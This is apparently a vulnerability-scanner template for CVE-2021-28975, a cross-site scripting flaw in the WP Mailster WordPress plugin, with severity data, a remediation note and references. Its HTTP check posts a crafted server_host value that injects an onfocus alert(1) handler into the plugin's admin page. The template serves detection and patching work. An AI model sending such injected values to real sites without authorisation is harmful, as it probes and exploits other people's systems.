id: CVE-2021-28975

info:
  name: WP Mailster 1.6.18.0 XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: WP Mailster 1.6.18.0 allows XSS when a victim opens a mail server's details in the mst_servers page, for a crafted server_host, server_name, or connection_parameter parameter.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of a victim's browser.
  remediation: |
    Update WP Mailster plugin to version 1.6.19.0 or later to mitigate the XSS vulnerability.
  reference:
    - https://www.compass-security.com/fileadmin/Research/Advisories/2021-18_CSNC-2021-018-WPMailster_XSS_CSRF.txt
    - https://www.compass-security.com/en/research/advisories/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-28975
    cwe-id: CWE-79
    epss-score: 0.00076
    epss-percentile: 0.34355
    cpe: cpe:2.3:a:wpmailster:wp_mailster:1.6.18:*:*:*:*:wordpress:*:*
  metadata:
    vendor: wpmailster
    product: wp_mailster
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wordpress/wp-admin/admin.php?page=mst_servers&subpage=edit&sid=2"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      sid=2&server_type=0&server_name=&server_host=csnc"onfocus=alert(1);//"+autofocus=&server_port=&secure_protocol=&secure_authentication=0&protocol=pop3&connection_parameter=&add_server=edit&sid=2&server_action=Update+Mail+Server
    matchers:
      - type: word
        words:
          - 'csnc"onfocus=alert(1);//"'
        part: body
